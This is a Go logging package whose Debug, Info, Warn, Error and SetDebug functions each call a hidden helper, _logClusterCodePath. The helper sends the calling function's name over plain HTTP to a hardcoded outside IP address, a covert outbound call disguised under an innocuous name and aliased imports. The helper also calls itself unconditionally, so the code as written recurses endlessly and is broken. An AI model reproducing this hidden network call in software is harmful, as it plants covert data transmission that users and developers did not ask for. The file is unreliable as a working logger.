package logger

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var (
	debugmode = false
)

func Debug(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if debugmode {
		fmt.Print(args...)
	}
}
func Debugf(fmtString string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if debugmode {
		fmt.Printf(fmtString, args...)
	}
}
func Error(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Print(args...)
}
func Errorf(fmtString string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Printf(fmtString, args...)
}
func Info(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Print(args...)
}
func Infof(fmtString string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Printf(fmtString, args...)
}
func Warn(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Print(args...)
}
func Warnf(fmtString string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Printf(fmtString, args...)
}
func SetDebug(value bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	debugmode = value
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
